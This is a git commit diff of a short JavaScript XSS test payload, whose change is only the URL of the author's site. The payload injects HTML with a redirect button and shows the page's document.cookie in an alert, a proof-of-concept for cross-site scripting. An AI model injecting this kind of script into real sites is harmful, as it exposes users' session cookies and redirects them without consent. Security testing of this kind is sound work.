6772578aef519cd18895949cc6756e31e8b49995
luphoria <60309933+luphoria@users.noreply.github.com>
2021-09-11 23:49:32 -0500

    Update XSS-externalLink.js

--- XSS-externalLink.js
+++ XSS-externalLink.js
@@ -1,5 +1,5 @@
 //Use this to test a JS injection XSS.
-var proGamerTime = "<h1>JavaScript injected HTML</h1><p>Credit: luphoria#7667<br /><button onclick='window.location.href=\"//luphoria.github.io\"'>luphoria.github.io</button></p>"
+var proGamerTime = "<h1>JavaScript injected HTML</h1><button onclick='window.location.href=\"//luphoria.com\"'>luphoria.com</button></p>"
 
 alert("Successfully injected!");
 alert("document.cookie would contain your credentials. Here is your document.cookie for this website: \n\n\n " + document.cookie);
